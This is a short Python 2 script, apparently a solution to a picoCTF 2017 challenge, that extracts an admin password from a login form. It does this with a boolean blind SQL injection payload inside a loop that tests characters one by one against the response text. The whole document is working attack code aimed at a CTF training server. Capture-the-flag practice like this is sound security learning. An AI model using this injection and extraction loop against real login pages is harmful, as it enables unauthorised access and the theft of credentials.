#!/usr/bin/env python

import urllib
import urllib2
import string

def connect(url,header = {},postdata = {}):
    postdata = urllib.urlencode(postdata)
    try:
        if postdata:
            request = urllib2.Request(url,headers = header,data = postdata)
        else:
            request = urllib2.Request(url,headers = header)
        opener = urllib2.build_opener()
        response = opener.open(request)
    except:
        return "",{}
    page = response.read().decode("utf-8","ignore")
    info = dict(response.info())
    return page,info

url = "http://shell2017.picoctf.com:21088"

ans = ""

for i in xrange(1,64):
    for char in '_' + string.ascii_lowercase + string.digits:
        payload = "admin' AND substr((SELECT pass FROM users WHERE user = 'admin'),{},1) = '{}' -- ".format(i,char)
        page,info = connect(url,{},{"username" : payload, "password" : ""})
        if page.find("Incorrect Password") != -1:
            ans += char
            break

print "flag -> " + ans
